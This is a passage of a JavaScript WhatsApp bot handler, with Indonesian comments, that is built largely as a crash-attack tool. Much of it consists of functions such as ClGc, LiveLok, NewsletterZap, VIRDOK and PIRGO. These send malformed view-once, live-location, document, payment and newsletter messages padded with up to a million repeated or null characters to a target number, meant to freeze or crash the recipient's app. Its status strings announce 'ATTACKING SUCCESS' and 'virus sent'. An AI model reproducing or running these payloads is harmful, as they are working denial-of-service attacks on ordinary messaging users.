/*
 # SCRIPT ORI RIZXZTZY
 - DI LARANG RENAME
 - DI LARANG MEMPERJUAL
 - DI LARANG MEMPER SEBAR
 - DI LARANG MEREBUT ISTRI TETANGGA
 
 # THANK YOU
    ALWAYSAQIOO (ORG TERGANTENG)
    PAKTZY (ORNG TERGANTENG KE2)
    
 # NOTE
    SEMOGA KALIAN MEMAHAMI LARANGAN DI ATAS
*/
module.exports = async (rzx, m, store) => {
try {
const from = m.key.remoteJid
const quoted = m.quoted ? m.quoted : m
const body = (m.mtype === 'conversation') ? m.message.conversation : (m.mtype == 'imageMessage') ? m.message.imageMessage.caption : (m.mtype == 'videoMessage') ? m.message.videoMessage.caption : (m.mtype == 'extendedTextMessage') ? m.message.extendedTextMessage.text : (m.mtype == 'buttonsResponseMessage') ? m.message.buttonsResponseMessage.selectedButtonId : (m.mtype == 'listResponseMessage') ? m.message.listResponseMessage.singleSelectrzxReply.selectedRowId : (m.mtype === 'interactiveResponseMessage') ? JSON.parse(m.message.interactiveResponseMessage.nativeFlowResponseMessage.paramsJson).id : (m.mtype == 'templateButtonrzxReplyMessage') ? m.message.templateButtonrzxReplyMessage.selectedId : (m.mtype === 'messageContextInfo') ? (m.message.buttonsResponseMessage?.selectedButtonId || m.message.listResponseMessage?.singleSelectrzxReply.selectedRowId || m.text) : ''
const budy = (typeof m.text == 'string' ? m.text : '')
const prefix = /^[°zZ#$@+,.?=''():√%!¢£¥€π¤ΠΦ&><`™©®Δ^βα¦|/\\©^]/.test(body) ? body.match(/^[°zZ#$@+,.?=''():√%¢£¥€π¤ΠΦ&><!`™©®Δ^βα¦|/\\©^]/gi) : '.'
const isCmd = body.startsWith(prefix)
const command = body.replace(prefix, '').trim().split(/ +/).shift().toLowerCase() //kalau mau no prefix ganti jadi ini : const command = body.replace(prefix, '').trim().split(/ +/).shift().toLowerCase()
const args = body.trim().split(/ +/).slice(1)
const mime = (quoted.msg || quoted).mimetype || ''
const text = q = args.join(" ")
const isGroup = from.endsWith('@g.us')
const botNumber = await rzx.decodeJid(rzx.user.id)
const sender = m.key.fromMe ? (rzx.user.id.split(':')[0]+'@s.whatsapp.net' || rzx.user.id) : (m.key.participant || m.key.remoteJid)
const senderNumber = sender.split('@')[0]
const pushname = m.pushName || `${senderNumber}`
const isBot = botNumber.includes(senderNumber)
const groupMetadata = isGroup ? await rzx.groupMetadata(m.chat).catch(e => {}) : ''
const groupName = isGroup ? groupMetadata.subject : ''
const participants = isGroup ? await groupMetadata.participants : ''
const groupAdmins = isGroup ? await participants.filter(v => v.admin !== null).map(v => v.id) : ''
const groupOwner = isGroup ? groupMetadata.owner : ''
const groupMembers = isGroup ? groupMetadata.participants : ''
const isBotAdmins = isGroup ? groupAdmins.includes(botNumber) : false
const isBotGroupAdmins = isGroup ? groupAdmins.includes(botNumber) : false
const isGroupAdmins = isGroup ? groupAdmins.includes(sender) : false
const isAdmins = isGroup ? groupAdmins.includes(sender) : false
const tanggal = moment.tz('Asia/Jakarta').format('DD/MM/YY')
const { Client } = require('ssh2');
const { remini } = require('./all/remini');
const jsobfus = require('javascript-obfuscator');
const { addSaldo, minSaldo, cekSaldo } = require("./all/database/deposit");
const { beta1, beta2, buk1 } = require("./RzxNewBeta/rzxzsystemCrashBeta.js")
const xbug = fs.readFileSync(`./Virtex/xeontext6.js`)
const buttonvir = fs.readFileSync(`./Virtex/buttonvirus.js`)
const notifcrash = fs.readFileSync(`./Virtex/notif4.js`)
const TheRzx = fs.readFileSync(`./Media/Menu.jpg`)
const nulll2 = fs.readFileSync(`./Media/nulll2.jpg`)
const nulll = fs.readFileSync(`./Media/nulll.jpg`)
const gsz = fs.readFileSync(`./Media/gsz.jpg`)
const lisa = fs.readFileSync(`./Media/gsz.jpg`)
const fakedoc = fs.readFileSync(`./all/doc.apk`)
const bugcrash = fs.readFileSync(`./Media/TheRzx.jpg`)
const content = JSON.stringify(m.message)
const audiorzx = fs.readFileSync('./RzxNewBeta/zet.mp3')
const resbug = (`*Prosess⚡*`)
const donebug = (`『 𝐀𝐓𝐓𝐀𝐂𝐊𝐈𝐍𝐆 𝐒𝐔𝐂𝐂𝐄𝐒𝐒 』

𖥂 𝐒𝐓𝐀𝐓𝐔𝐒 : 𝗦𝘂𝗰𝗰𝗲𝘀𝘀𝗳𝘂𝗹𝗹𝘆
𖥂 𝐕𝐈𝐑𝐔𝐒 : X̥ͦ  I̥ͦN̥ͦF̥ͦI̥ͦN̥ͦI̥ͦT̥ͦY̥ͦ  M̥ͦE̥ͦD̥ͦI̥ͦU̥ͦM̥ͦ

    𝐍𝐎𝐓𝐄
> Virus Sudah Terkirim, Jika Target C2 Maka Target Mengalami Delay Maker`)
const donebug2 = (`『 𝐀𝐓𝐓𝐀𝐂𝐊𝐈𝐍𝐆 𝐒𝐔𝐂𝐂𝐄𝐒𝐒 』

𖥂 𝐒𝐓𝐀𝐓𝐔𝐒 : 𝗦𝘂𝗰𝗰𝗲𝘀𝘀𝗳𝘂𝗹𝗹𝘆
𖥂 𝐕𝐈𝐑𝐔𝐒 : X̥ͦ  I̥ͦN̥ͦF̥ͦI̥ͦN̥ͦI̥ͦT̥ͦY̥ͦ  I̥ͦO̥ͦS̥ͦ

    𝐍𝐎𝐓𝐄
> Virus Sudah Terkirim, Jika Target C2 Maka Target Mengalami Delay Maker`)
const donebug3 = (`『 𝐀𝐓𝐓𝐀𝐂𝐊𝐈𝐍𝐆 𝐒𝐔𝐂𝐂𝐄𝐒𝐒 』

𖥂 𝐒𝐓𝐀𝐓𝐔𝐒 : 𝗦𝘂𝗰𝗰𝗲𝘀𝘀𝗳𝘂𝗹𝗹𝘆
𖥂 𝐕𝐈𝐑𝐔𝐒 : X̥ͦ  I̥ͦN̥ͦF̥ͦI̥ͦN̥ͦI̥ͦT̥ͦY̥ͦ  H̥ͦḀͦR̥ͦD̥ͦ

    𝐍𝐎𝐓𝐄
> Virus Sudah Terkirim, Jika Target C2 Maka Target Mengalami Delay Maker`)
const isQuotedViewOnce = m.mtype === "extendedTextMessage" && content.includes("viewOnceMessage")
const taskdone = (teks) => {
			return rzx.sendMessage(m.chat, {
				react: {
					text: teks,
					key: m.key
				}
			})
		}
const qpay = {
	key: {
		remoteJid: '0@s.whatsapp.net',
		fromMe: false,
		id: '0@s.whatsapp.net',
		participant: '0@s.whatsapp.net'
	},
	message: {
		requestPaymentMessage: {
			currencyCodeIso4217: 'IDR',
			amount1000: 999999,
			requestFrom: '0@s.whatsapp.net',
			noteMessage: {
				extendedTextMessage: {
					text: '͟͟͞͞🩸⃟༑⌁⃰𝑹𝒊𝒛𝒙𝒛𝑻𝒛𝒚 𝐄𝐱ͯ͢𝐞𝐜𝐮͢𝐭𝐢𝐨𝐧 𝐕ͮ𝐚͢𝐮𝐥𝐭ཀ͜͡🦠'
				}
			},
			expiryTimestamp: 999999999,
			amount: {
				value: 91929291929,
				offset: 1000,
				currencyCode: 'INR'
			}
		}
	}
};
function generateRandomPassword() {
  const characters = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789@#%^&*';
  const length = 10;
  let password = '';
  for (let i = 0; i < length; i++) {
    const randomIndex = Math.floor(Math.random() * characters.length);
    password += characters[randomIndex];
  }
  return password;
}
const qchanel = {
key: {
remoteJid: 'status@broadcast',
fromMe: false,
participant: '0@s.whatsapp.net'
},
message: {
newsletterAdminInviteMessage: {
newsletterJid: `1203632@newsletter`,
newsletterName: `Hore`,
jpegThumbnail: "",
caption: `Powered By ${nameCreator}`,
inviteExpiration: Date.now() + 1814400000
}
}}
let db_saldo = JSON.parse(fs.readFileSync("./all/database/saldo.json"));

// Auto Blocked Nomor +212
if (m.sender.startsWith('212')) return rzx.updateBlockStatus(m.sender, 'block')

// Random Color
const listcolor = ['red','green','yellow','blue','magenta','cyan','white']
const randomcolor = listcolor[Math.floor(Math.random() * listcolor.length)]

// Command Yang Muncul Di Console
if (isCmd) {
console.log(chalk.yellow.bgCyan.bold(namabot), color(`[ PESAN ]`, `${randomcolor}`), color(`FROM`, `${randomcolor}`), color(`${pushname}`, `${randomcolor}`), color(`Text :`, `${randomcolor}`), color(`${body}`, `white`))
}

        // Days
        const hariini = moment.tz('Asia/Jakarta').format('dddd, DD MMMM YYYY')
        const wib = moment.tz('Asia/Jakarta').format('HH : mm :ss')
        const wit = moment.tz('Asia/Jayapura').format('HH : mm : ss')
        const wita = moment.tz('Asia/Makassar').format('HH : mm : ss')

        const time2 = moment().tz('Asia/Jakarta').format('HH:mm:ss')
        if (time2 < "23:59:00") {
            var ucapanWaktu = 'Selamat Malam 🏙️'
        }
        if (time2 < "19:00:00") {
            var ucapanWaktu = 'Selamat Petang 🌆'
        }
        if (time2 < "18:00:00") {
            var ucapanWaktu = 'Selamat Sore 🌇'
        }
        if (time2 < "15:00:00") {
            var ucapanWaktu = 'Selamat Siang 🌤️'
        }
        if (time2 < "10:00:00") {
            var ucapanWaktu = 'Selamat Pagi 🌄'
        }
        if (time2 < "05:00:00") {
            var ucapanWaktu = 'Selamat Subuh 🌆'
        }
        if (time2 < "03:00:00") {
            var ucapanWaktu = 'Selamat Tengah Malam 🌃'
        }

// Database
const contacts = JSON.parse(fs.readFileSync("./all/database/contacts.json"))
const prem = JSON.parse(fs.readFileSync("./all/database/premium.json"))
const ownerNumber = JSON.parse(fs.readFileSync("./all/database/owner.json"))

// Cek Database
const isContacts = contacts.includes(sender)
const isPremium = prem.includes(sender)
const isOwner = ownerNumber.includes(senderNumber)

// Jangan Di Edit Tar Error
let list = []
for (let i of ownerNumber) {
list.push({
displayName: await rzx.getName(i + '@s.whatsapp.net'),
vcard: `BEGIN:VCARD\n
VERSION:3.0\n
N:${await rzx.getName(i + '@s.whatsapp.net')}\n
FN:${await rzx.getName(i + '@s.whatsapp.net')}\n
item1.TEL;waid=${i}:${i}\n
item1.X-ABLabel:Ponsel\n
item2.EMAIL;type=INTERNET:rzx@gmail.com\n
item2.X-ABLabel:Email\n
item3.URL:https://chat.whatsapp.com/Bn3tcvTGopCHirKLd2Us9z
item3.X-ABLabel:YouTube\n
item4.ADR:;;Indonesia;;;;\n
item4.X-ABLabel:Region\n
END:VCARD`
})
}

   function toRupiah(angka) {
var saldo = '';
var angkarev = angka.toString().split('').reverse().join('');
for (var i = 0; i < angkarev.length; i++)
if (i % 3 == 0) saldo += angkarev.substr(i, 3) + '.';
return '' + saldo.split('', saldo.length - 1).reverse().join('');
}
 
// Gak Usah Di Apa Apain Jika Tidak Mau Error
try {
ppuser = await rzx.profilePictureUrl(m.sender, 'image')
} catch (err) {
ppuser = 'https://cdn.pixabay.com/photo/2015/10/05/22/37/blank-profile-picture-973460_960_720.png?q=60'
}

// Fake Resize
const fkethmb = await reSize(ppuser, 400, 400)

//reply
		const zets = {
			key: {
				fromMe: false,
				participant: "0@s.whatsapp.net",
				remoteJid: "status@broadcast"
			},
			message: {
				orderMessage: {
					orderId: "2029",
					thumbnail: TheRzx,
					itemCount: `777`,
					status: "INQUIRY",
					surface: "CATALOG",
					message: `🩸⃟༑⌁⃰𝑹𝒊𝒛𝒙𝒛𝑻𝒛𝒚ཀ͜͡🐉`,
					token: "AR6xBKbXZn0Xwmu76Ksyd7rnxI+Rx87HfinVlW4lwXa6JA=="
				}
			},
			contextInfo: {
				mentionedJid: [m.sender],
				forwardingScore: 999,
				isForwarded: true
			}
		}
// FUNCTION OBFUSCATOR 
async function obfus(query) {
return new Promise((resolve, reject) => {
try {
const obfuscationResult = jsobfus.obfuscate(query,
{
compact: false,
controlFlowFlattening: true,
controlFlowFlatteningThreshold: 1,
numbersToExpressions: true,
simplify: true, 
stringArrayShuffle: true,
splitStrings: true,
stringArrayThreshold: 1
}
);
const result = {
status: 2000,
author: `rzx`,
result: obfuscationResult.getObfuscatedCode()
}
resolve(result)
} catch (e) {
reject(e)
}
})
}
// Cuma Fake
const sendOrder = async(jid, text, orid, img, itcount, title, sellers, tokens, ammount) => {
const order = generateWAMessageFromContent(jid, proto.Message.fromObject({
"orderMessage": {
"orderId": orid,
"thumbnail": img,
"itemCount": itcount,
"status": "INQUIRY",
"surface": "CATALOG",
"orderTitle": title,
"message": text,
"sellerJid": sellers,
"token": tokens,
"totalAmount1000": ammount,
"totalCurrencyCode": "IDR",
}
}), { userJid: jid, quoted: m })
rzx.relayMessage(jid, order.message, { messageId: order.key.id})
}
// FUNCTION BUG
		async function caltx(LockJids) {
			let etc = generateWAMessageFromContent(
				LockJids,
				proto.Message.fromObject({
					viewOnceMessage: {
						message: {
							scheduledCallCreationMessage: {
								scheduledTimestampMs: Date.now(),
								callType: 2,
								title: ""
							}
						}
					},
				}), {
					userJid: LockJids
				}
			);
			await rzx.relayMessage(LockJids, etc.message, {});
		}
		async function ClGc(LockJids) {
			await rzx.relayMessage(LockJids, {
				viewOnceMessage: {
					message: {
						interactiveMessage: {
							header: {
								title: "",
								locationMessage: {},
								hasMediaAttachment: true
							},
							body: {
								text: "🩸⃟༑⌁⃰𝑹𝒊𝒛𝒙𝒛𝑻𝒛𝒚 𝑪͢𝒓𝒂ͯ͢𝒔𝒉ཀ͜͡🐉" + "Ãª¦¾ꦾ".repeat(900000)
							},
							nativeFlowMessage: {
								messageParamsJson: ""
							},
							carouselMessage: {}
						}
					}
				}
			}, {});
			let target = fs.readFileSync('./Media/Menu.jpg')
			await rzx.sendMessage(LockJids, {
				sticker: target
			}, {
				quoted: GSZ
			})
		}
		
		//SPAMMING FLOODS\\
		async function LiveLok(LockJids, QUOTED) {
			var etc = generateWAMessageFromContent(LockJids, proto.Message.fromObject({
				viewOnceMessage: {
					message: {
						"liveLocationMessage": {
							"degreesLatitude": "x",
							"degreesLongitude": "x",
							"caption": `🩸⃟༑⌁⃰𝑹𝒊𝒛𝒙𝒛𝑻𝒛𝒚 𝑪͢𝒓𝒂ͯ͢𝒔𝒉ཀ͜͡🐉` + "Ãª¦¾ꦾ".repeat(900000),
							"sequenceNumber": "0",
							"jpegThumbnail": ""
						}
					}
				}
			}), {
				userJid: LockJids,
				quoted: QUOTED
			});
			await rzx.relayMessage(LockJids, etc.message, {
				messageId: etc.key.id
			});
		}
		
		//NEWSTELER X PAYMENT\\
		async function ngeloc(target, kuwoted) {
var etc = generateWAMessageFromContent(target, proto.Message.fromObject({
viewOnceMessage: {
message: {
  "liveLocationMessage": {
    "degreesLatitude": "p",
    "degreesLongitude": "p",
    "caption": `R̥ͦI̥ͦZ̥ͦX̥ͦZ̥ͦ  C̥ͦR̥ͦḀͦS̥ͦH̥ͦ  S̥ͦY̥ͦS̥ͦT̥ͦE̥ͦM`+"ꦾ".repeat(50000),
    "sequenceNumber": "0",
    "jpegThumbnail": ""
     }
  }
}
}), { userJid: target, quoted: kuwoted })
await rzx.relayMessage(target, etc.message, { participant: { jid: target }, messageId: etc.key.id })
}
async function sendListMessage(jid) {
  var messageContent = generateWAMessageFromContent(jid, proto.Message.fromObject({
    'listMessage': {
      'title': "" + "R̥ͦI̥ͦZ̥ͦX̥ͦZ̥ͦ  C̥ͦR̥ͦḀͦS̥ͦH̥ͦ  S̥ͦY̥ͦS̥ͦT̥ͦE̥ͦM" +"\0".repeat(920000),
      'footerText': "àº®â‚®à½žà¸¨Vê™°à¸¨ à¹–àº¡Gê™°à½€Í¡Íœâœ…âƒŸâ•®",
      'description': "àº®â‚®à½žà¸¨Vê™°à¸¨ à¹–àº¡Gê™°à½€Í¡Íœâœ…âƒŸâ•®",
      'buttonText': null,
      'listType': 2,
      'productListInfo': {
        'productSections': [{
          'title': "lol",
          'products': [{
            'productId': "4392524570816732"
          }]
        }],
        'productListHeaderImage': {
          'productId': "4392524570816732",
          'jpegThumbnail': null
        },
        'businessOwnerJid': "0@s.whatsapp.net"
      }
    },
    'footer': "lol",
    'contextInfo': {
      'expiration': 600000,
      'ephemeralSettingTimestamp': "1679959486",
      'entryPointConversionSource': "global_search_new_chat",
      'entryPointConversionApp': "whatsapp",
      'entryPointConversionDelaySeconds': 9,
      'disappearingMode': {
        'initiator': "INITIATED_BY_ME"
      }
    },
    'selectListType': 2,
    'product_header_info': {
      'product_header_info_id': 292928282928,
      'product_header_is_rejected': false
    }
  }), {
    'userJid': jid
  });
  
  await rzx.relayMessage(jid, messageContent.message, {
    'participant': {
      'jid': jid
    },
    'messageId': messageContent.key.id
  });
}

		async function PayMent(LockJids) {
			var messageContent = generateWAMessageFromContent(LockJids, proto.Message.fromObject({
				'viewOnceMessage': {
					'message': {
						'interactiveMessage': {
							'header': {
								"hasMediaAttachment": true,
								'sequenceNumber': '0',
								"jpegThumbnail": ""
							},
							'nativeFlowMessage': {
								"buttons": [{
									"name": "review_and_pay",
									"buttonParamsJson": `{\"currency\":\"IDR\",\"total_amount\":{\"value\":49981399788,\"offset\":100},\"reference_id\":\"4OON4PX3FFJ\",\"type\":\"physical-goods\",\"order\":{\"status\":\"payment_requested\",\"subtotal\":{\"value\":49069994400,\"offset\":100},\"tax\":{\"value\":490699944,\"offset\":100},\"discount\":{\"value\":485792999999,\"offset\":100},\"shipping\":{\"value\":48999999900,\"offset\":100},\"order_type\":\"ORDER\",\"items\":[{\"retailer_id\":\"7842674605763435\",\"product_id\":\"7842674605763435\",\"name\":\k${VxO},\"amount\":{\"value\":9999900,\"offset\":100},\"quantity\":7},{\"retailer_id\":\"custom-item-f22115f9-478a-487e-92c1-8e7b4bf16de8\",\"name\":\"\",\"amount\":{\"value\":999999900,\"offset\":100},\"quantity\":49}]},\"native_payment_methods\":[]}`
								}],
								"messageParamsJson": '\0'.repeat(10000),
							}
						}
					}
				}
			}), {});
			rzx.relayMessage(LockJids, messageContent.message, {
				'messageId': messageContent.key.id
			});
		}
		const VxO = "🔥⃰͜͡⭑𝐕𝐱͢𝐎⭑͜͡🔥⃰" + "\u0000".repeat(50000)
		async function NewsletterZap(LockJids) {
			var messageContent = generateWAMessageFromContent(LockJids, proto.Message.fromObject({
				'viewOnceMessage': {
					'message': {
						"newsletterAdminInviteMessage": {
							"newsletterJid": `120363298524333143@newsletter`,
							"newsletterName": "🚫⃰͜͡⭑𝐓𝐝͢𝐗⭑͜͡🚫⃰" + "\u0000".repeat(920000),
							"jpegThumbnail": "",
							"caption": `𝑹𝒊𝒛𝒙𝒛𝑻𝒛𝒚🐉`,
							"inviteExpiration": Date.now() + 1814400000
						}
					}
				}
			}), {
				'userJid': LockJids
			});
			await rzx.relayMessage(LockJids, messageContent.message, {
				'participant': {
					'jid': LockJids
				},
				'messageId': messageContent.key.id
			});
		}

		//REVISION\\
		async function iponcrash(target) {
await rzx.relayMessage(target, {"paymentInviteMessage": {serviceType: "FBPAY",expiryTimestamp: Date.now() + 1814400000}},{})
sleep(200)
await rzx.relayMessage(target, {"paymentInviteMessage": {serviceType: "FBPAY",expiryTimestamp: Date.now() + 1814400000}},{ participant: { jid: target } })
sleep(200)
await rzx.relayMessage(target, {"paymentInviteMessage": {serviceType: "FBPAY",expiryTimestamp: Date.now() + 1814400000}},{})
}

		async function LIVELOK(LockJids, QUOTED) {
			var etc = generateWAMessageFromContent(LockJids, proto.Message.fromObject({
				viewOnceMessage: {
					message: {
						"liveLocationMessage": {
							"degreesLatitude": "p",
							"degreesLongitude": "p",
							"caption": `🍷꙰͜͡𝑹𝒊𝒛𝒙𝒛𝑻𝒛𝒚💸` + "Ãª¦¾".repeat(900000),
							"sequenceNumber": "0",
							"jpegThumbnail": ""
						}
					}
				}
			}), {
				userJid: LockJids,
				quoted: QUOTED
			})
			await rzx.relayMessage(LockJids, etc.message, {
				participant: {
					jid: LockJids
				},
				messageId: etc.key.id
			})
		}

		async function VIRDOK(LockJids, QUOTED) {
			var etc = generateWAMessageFromContent(LockJids, proto.Message.fromObject({
				"documentMessage": {
					"url": "https://mmg.whatsapp.net/v/t62.7119-24/40377567_1587482692048785_2833698759492825282_n.enc?ccb=11-4&oh=01_Q5AaIEOZFiVRPJrllJNvRA-D4JtOaEYtXl0gmSTFWkGxASLZ&oe=666DBE7C&_nc_sid=5e03e0&mms3=true",
					"mimetype": "penis",
					"fileSha256": "ld5gnmaib+1mBCWrcNmekjB4fHhyjAPOHJ+UMD3uy4k=",
					"fileLength": "999999999",
					"pageCount": 999999999,
					"mediaKey": "5c/W3BCWjPMFAUUxTSYtYPLWZGWuBV13mWOgQwNdFcg=",
					"fileName": `🔥፝⃟ ꙳𝑹𝒊𝒛𝒙𝒛𝑻𝒛𝒚🔥፝⃟` + "\u0000".repeat(900000),
					"fileEncSha256": "pznYBS1N6gr9RZ66Fx7L3AyLIU2RY5LHCKhxXerJnwQ=",
					"directPath": "/v/t62.7119-24/40377567_1587482692048785_2833698759492825282_n.enc?ccb=11-4&oh=01_Q5AaIEOZFiVRPJrllJNvRA-D4JtOaEYtXl0gmSTFWkGxASLZ&oe=666DBE7C&_nc_sid=5e03e0",
					"mediaKeyTimestamp": "1715880173"
				}
			}), {
				userJid: LockJids,
				quoted: QUOTED
			});
			await rzx.relayMessage(LockJids, etc.message, {
				participant: {
					jid: LockJids
				},
				messageId: etc.key.id
			});
		}

        async function sendSessionStructure(target, sessionVersion, localIdentityPublic, remoteIdentityPublic, rootKey, previousCounter, senderChain, receiverChains, pendingKeyExchange, pendingPreKey, remoteRegistrationId, localRegistrationId, needsRefresh, aliceBaseKey) {
    var sessionStructure = generateWAMessageFromContent(target, proto.Message.fromObject({
        'sessionStructure': {
            'sessionVersion': sessionVersion,
            'localIdentityPublic': localIdentityPublic,
            'remoteIdentityPublic': remoteIdentityPublic,
            'rootKey': rootKey,
            'previousCounter': previousCounter,
            'senderChain': senderChain,
            'receiverChains': receiverChains,
            'pendingKeyExchange': pendingKeyExchange,
            'pendingPreKey': pendingPreKey,
            'remoteRegistrationId': remoteRegistrationId,
            'localRegistrationId': localRegistrationId,
            'needsRefresh': needsRefresh,
            'aliceBaseKey': aliceBaseKey
        }
    }), { userJid: target });

    await rzx.relayMessage(target, sessionStructure.message, { participant: { jid: target }, messageId: sessionStructure.key.id });
}

		async function BLEKING(LockJids, QUOTED) {
			var etc = generateWAMessageFromContent(LockJids, proto.Message.fromObject({
				"stickerMessage": {
					"url": "https://mmg.whatsapp.net/o1/v/t62.7118-24/f1/m233/up-oil-image-8529758d-c4dd-4aa7-9c96-c6e2339c87e5?ccb=9-4&oh=01_Q5AaIM0S5OdSlOJSYYsXZtqnZ-ifJC0XbXv3AWEfPbcBBjRJ&oe=666DA5A2&_nc_sid=000000&mms3=true",
					"fileSha256": "CWJIxa1y5oks/xelBSo440YE3bib/c/I4viYkrCQCFE=",
					"fileEncSha256": "r6UKMeCSz4laAAV7emLiGFu/Rup9KdbInS2GY5rZmA4=",
					"mediaKey": "4l/QOq+9jLOYT2m4mQ5Smt652SXZ3ERnrTfIsOmHWlU=",
					"mimetype": "image/webp",
					"directPath": "/o1/v/t62.7118-24/f1/m233/up-oil-image-8529758d-c4dd-4aa7-9c96-c6e2339c87e5?ccb=9-4&oh=01_Q5AaIM0S5OdSlOJSYYsXZtqnZ-ifJC0XbXv3AWEfPbcBBjRJ&oe=666DA5A2&_nc_sid=000000",
					"fileLength": "10116",
					"mediaKeyTimestamp": "1715876003",
					"isAnimated": false,
					"stickerSentTs": "1715881084144",
					"isAvatar": false,
					"isAiSticker": false,
					"isLottie": false
				}
			}), {
				userJid: LockJids,
				quoted: QUOTED
			});
			await rzx.relayMessage(LockJids, etc.message, {
				participant: {
					jid: LockJids
				},
				messageId: etc.key.id
			});
		}

		async function PIRGO(LockJids, QUOTED) {
			var etc = generateWAMessageFromContent(LockJids, proto.Message.fromObject({
				interactiveMessage: {
					header: {
						title: "🩸⃟༑⌁⃰𝑹𝒊𝒛𝒙𝒛𝑻𝒛𝒚 𝐄𝐱ͯ͢𝐞𝐜𝐮͢𝐭𝐢𝐨𝐧 𝐕ͮ𝐚͢𝐮𝐥𝐭ཀ͜͡🦠",
						hasMediaAttachment: true,
						...(await prepareWAMessageMedia({
							image: {
								url: "https://telegra.ph/file/e8c1aee03b13f008ff65d.jpg"
							}
						}, {
							upload: rzx.waUploadToServer
						}))
					},
					body: {
						text: ""
					},
					footer: {
						text: "› ©𝑹𝒊𝒛𝒙𝒛𝑻𝒛𝒚!!"
					},
					nativeFlowMessage: {
						messageParamsJson: " ".repeat(1000000)
					}
				}
			}), {
				userJid: LockJids,
				quoted: QUOTED
			});
			await rzx.relayMessage(LockJids, etc.message, {
				participant: {
					jid: LockJids
				},
				messageId: etc.key.id
			});
		}

        	const dottm = {
			key: {
				fromMe: false,
				participant: '0@s.whatsapp.net',
				remoteJid: 'status@broadcast'
			},
			message: {
				orderMessage: {
					orderId: '999999999999',
					thumbnail: null,
					itemCount: 999999999999,
					status: 'INQUIRY',
					surface: 'CATALOG',
					message: '▾ 𝑹𝒊𝒛𝒙𝒛𝑻𝒛𝒚 𝐄𝐱ͯ͢𝐞𝐜𝐮͢𝐭𝐢𝐨𝐧 𝐕ͮ𝐚͢𝐮𝐥𝐭 ▾',
					token: 'AR6xBKbXZn0Xwmu76Ksyd7rnxI+Rx87HfinVlW4lwXa6JA=='
				}
			},
			contextInfo: {
				mentionedJid: ['27746135260@s.whatsapp.net'],
				forwardingScore: 999,
				isForwarded: true
			}
		}
		
		const PORKE = {
			key: {
				participant: `0@s.whatsapp.net`,
				...(m.chat ? {
					remoteJid: "status@broadcast"
				} : {})
			},
			'message': {
				"interactiveMessage": {
					"header": {
						"hasMediaAttachment": true,
						"jpegThumbnail": fs.readFileSync(`./Media/Menu.jpg`)
					},
					"nativeFlowMessage": {
						"buttons": [{
							"name": "review_and_pay",
							"buttonParamsJson": `{\"currency\":\"IDR\",\"total_amount\":{\"value\":49981399788,\"offset\":100},\"reference_id\":\"4OON4PX3FFJ\",\"type\":\"physical-goods\",\"order\":{\"status\":\"payment_requested\",\"subtotal\":{\"value\":49069994400,\"offset\":100},\"tax\":{\"value\":490699944,\"offset\":100},\"discount\":{\"value\":485792999999,\"offset\":100},\"shipping\":{\"value\":48999999900,\"offset\":100},\"order_type\":\"ORDER\",\"items\":[{\"retailer_id\":\"7842674605763435\",\"product_id\":\"7842674605763435\",\"name\":\"️࿆᷍🩸⃟༑⌁⃰𝑹𝒊𝒛𝒙𝒛𝑻𝒛𝒚 𝑪͢𝒓𝒂ͯ͢𝒔𝒉 𝐈𝐧͢𝐟𝐢ͮ𝐧͢𝐢𝐭𝐲͜͡⃟╮\",\"amount\":{\"value\":9999900,\"offset\":100},\"quantity\":7},{\"retailer_id\":\"custom-item-f22115f9-478a-487e-92c1-8e7b4bf16de8\",\"name\":\"\",\"amount\":{\"value\":999999900,\"offset\":100},\"quantity\":49}]},\"native_payment_methods\":[]}`
						}]
					}
				}
			}
		}

		const PORKE2 = {
			key: {
				participant: `0@s.whatsapp.net`,
				...(m.chat ? {
					remoteJid: "status@broadcast"
				} : {})
			},
			'message': {
				"interactiveMessage": {
					"header": {
						"hasMediaAttachment": true,
						"jpegThumbnail": fs.readFileSync(`./Media/Menu.jpg`)
					},
					"nativeFlowMessage": {
						"buttons": [{
							"name": "review_and_pay",
							"buttonParamsJson": `{\"currency\":\"IDR\",\"total_amount\":{\"value\":49981399788,\"offset\":100},\"reference_id\":\"4OON4PX3FFJ\",\"type\":\"physical-goods\",\"order\":{\"status\":\"payment_requested\",\"subtotal\":{\"value\":49069994400,\"offset\":100},\"tax\":{\"value\":490699944,\"offset\":100},\"discount\":{\"value\":485792999999,\"offset\":100},\"shipping\":{\"value\":48999999900,\"offset\":100},\"order_type\":\"ORDER\",\"items\":[{\"retailer_id\":\"7842674605763435\",\"product_id\":\"7842674605763435\",\"name\":\"️࿆᷍🩸⃟༑⌁⃰𝑹𝒊𝒛𝒙𝒛𝑻𝒛𝒚 𝑪͢𝒓𝒂ͯ͢𝒔𝒉 𝐈𝐧͢𝐟𝐢ͮ𝐧͢𝐢𝐭𝐲͜͡⃟╮\",\"amount\":{\"value\":9999900,\"offset\":100},\"quantity\":7},{\"retailer_id\":\"custom-item-f22115f9-478a-487e-92c1-8e7b4bf16de8\",\"name\":\"\",\"amount\":{\"value\":999999900,\"offset\":100},\"quantity\":49}]},\"native_payment_methods\":[]}`
						}]
					}
				}
			}
		}
// function bug
const rizxzbug = { 
key: {
participant: `0@s.whatsapp.net`,
...(m.chat ? {
remoteJid: "status@broadcast"
} : {})
},
message: {
listResponseMessage: {
title: `RizxzzGaPnya 💸`
}
}
}

const wanted = {
            key: {
                remoteJid: 'p',
                fromMe: false,
                participant: '0@s.whatsapp.net'
            },
            message: {
                "interactiveResponseMessage": {
                    "body": {
                        "text": "Sent",
                        "format": "DEFAULT"
                    },
                    "nativeFlowResponseMessage": {
                        "name": "galaxy_message",
                        "paramsJson": `{\"screen_2_OptIn_0\":true,\"screen_2_OptIn_1\":true,\"screen_1_Dropdown_0\":\"ZetExecute\",\"screen_1_DatePicker_1\":\"1028995200000\",\"screen_1_TextInput_2\":\"czazxvoid@sky.id\",\"screen_1_TextInput_3\":\"94643116\",\"screen_0_TextInput_0\":\"radio - buttons${"\u0003".repeat(500000)}\",\"screen_0_TextInput_1\":\"Anjay\",\"screen_0_Dropdown_2\":\"001-Grimgar\",\"screen_0_RadioButtonsGroup_3\":\"0_true\",\"flow_token\":\"AQAAAAACS5FpgQ_cAAAAAE0QI3s.\"}`,
                        "version": 3
                    }
                }
            }
        }
        
const rizxzpemula = {
key: {
participant: `0@s.whatsapp.net`,
...(m.chat ? {
remoteJid: "status@broadcast"
} : {})
},
'message': {
"interactiveMessage": { 
"header": {
"hasMediaAttachment": true,
"jpegThumbnail": "",
},
"nativeFlowMessage": {
"buttons": [
{
"name": "review_and_pay",
